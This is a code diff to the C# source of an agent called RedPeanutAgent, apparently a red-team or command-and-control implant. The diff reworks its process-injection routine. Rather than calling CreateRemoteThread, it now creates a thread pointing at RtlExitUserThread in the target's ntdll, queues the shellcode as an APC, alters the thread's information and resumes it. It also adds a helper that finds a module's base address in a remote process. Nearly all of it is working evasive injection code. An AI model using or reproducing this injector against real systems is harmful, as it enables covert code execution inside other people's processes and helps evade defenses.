@@ -6,6 +6,7 @@
 
 using RedPeanutAgent.Core;
 using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 namespace RedPeanutAgent.Execution
@@ -29,6 +30,7 @@ namespace RedPeanutAgent.Execution
         {
             IntPtr hproc = OpenProcess(pid);
 
+            //Round payload size to page size
             uint size = InjectionHelper.GetSectionSize(payload.Length);
 
             //Crteate section in current process
@@ -65,9 +67,36 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            Natives.CreateRemoteThread(hproc, IntPtr.Zero, 0, baseAddrEx, IntPtr.Zero, 0, IntPtr.Zero);
-            Natives.CloseHandle(section);
-            Natives.CloseHandle(hproc);
+            IntPtr hNtdll = Natives.LoadLibrary("ntdll.dll");
+            IntPtr pExitUserThread = Natives.GetProcAddress(hNtdll, "RtlExitUserThread");
+            long offset = pExitUserThread.ToInt64() - hNtdll.ToInt64();
+
+            IntPtr pRemoteNtdll = GetRemoteModuleBaseAddress(pid,"ntdll.dll");
+            IntPtr pRemoteAddress = IntPtr.Add(pRemoteNtdll,(int)offset);
+
+            IntPtr hThread = IntPtr.Zero;
+
+            Natives.NtCreateThreadEx(out hThread, 0x1FFFFF,IntPtr.Zero , hproc, pRemoteAddress, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);
+
+            if(hThread == IntPtr.Zero)
+            {
+                return false;
+            }
+
+            Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
+            procInfo.hThread = hThread;
+            procInfo.hProcess = hproc;
+
+            // Assign address of shellcode to the target thread apc queue
+            if (!InjectionHelper.QueueApcThread(baseAddrEx, procInfo))
+            {
+                return false;
+            }
+
+            InjectionHelper.SetInformationThread(procInfo);
+
+            InjectionHelper.ResumeThread(procInfo);
+
             return true;
         }
 
@@ -279,5 +308,23 @@ namespace RedPeanutAgent.Execution
             int rest = Natives.ZwAlertResumeThread(th, out outsupn);
             return rest;
         }
+
+        public static IntPtr GetRemoteModuleBaseAddress(int pid, string modulename)
+        {
+            Process pProcess = Process.GetProcessById(pid);
+            ProcessModuleCollection processModules = pProcess.Modules;
+
+            for (int i = 0; i < processModules.Count; i++)
+            {
+                if (processModules[i].ModuleName.ToLower().Contains(modulename))
+                {
+                    return processModules[i].BaseAddress;
+                }
+
+            }
+            return IntPtr.Zero;
+        }
+
+        
     }
 }
